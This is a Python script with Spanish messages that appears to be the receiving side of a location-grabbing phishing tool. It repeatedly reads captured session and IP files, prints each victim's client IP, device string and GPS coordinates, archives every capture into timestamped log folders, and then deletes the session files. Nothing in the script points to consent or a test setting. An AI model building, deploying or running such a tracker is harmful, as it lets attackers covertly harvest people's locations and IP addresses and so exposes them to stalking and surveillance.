#!/usr/bin/python
from re import split
import re
import os
import signal
import sys

def validar(palabra):

  patron = '^[a-zA-Z0-9-]'
  return bool(re.search(patron, palabra))


def interrupcion(signal, contexto):
   print("Cierre de procesos CTRL+C")
   sys.exit(0)
signal.signal(signal.SIGINT, interrupcion)

while(True):
 try:
  try:
   if os.path.isfile('sesion.txt'):
    ma = open("ip.txt")
    f = open("sesion.txt")
    text = ma.read()
    text1 = f.read()
    result = split('\D\S\D+', text1)
    uc = result[-1]
    android = re.search(r"\((.*?)\)", text)
    var = validar(uc)
    if var == True:
     #echo -e [+] \\e[45mpool\\e[0]
     os.system("ip=$(sed -n 's/IP://p' ip.txt | tail -1);echo -e \\\e[31m[\\\e[97m+\\\e[31m]\\\e[97m \\\e[45mCLIENT IP : ${ip}\\\e[0]\\\e[0m\\\n")
     print('\x1b[1;31m[\x1b[1;97m+\x1b[1;31m] \x1b[1;97m(' + android.group(1) + ')')
     print(f"\x1b[1;31m[\x1b[1;97m+\x1b[1;31m] \x1b[1;97mCoordenadas: {uc}", end='')
     print("\x1b[1;31m[\x1b[1;97m*\x1b[1;31m] \x1b[1;33mEsparando capturas, \x1b[1;34mCtrl+Z [\x1b[1;97msalir\x1b[1;34m]\x1b[1;97m.")
     print ()
     os.system("mkdir -p logs/ipma")
     os.system("log_name=$(date +%d-%m-%Y-%H-%M-%S);cat sesion.txt > logs/${log_name}.txt")
     os.system("log_name=$(date +%d-%m-%Y-%H-%M-%S);tail -n 2 ip.txt > logs/ipma/${log_name}.txt")
     os.system("rm -rf .deneg_coords")
     os.system("rm -rf sesion.txt")
     f.close()
     #exit()
    else:
     os.system("echo no >/dev/null 2>&1")
     f.close()
  except AttributeError:
     os.system("echo no ma >/dev/null 2>&1")
 except NameError:
     os.system("echo sesion no existe >/dev/null 2>&1")
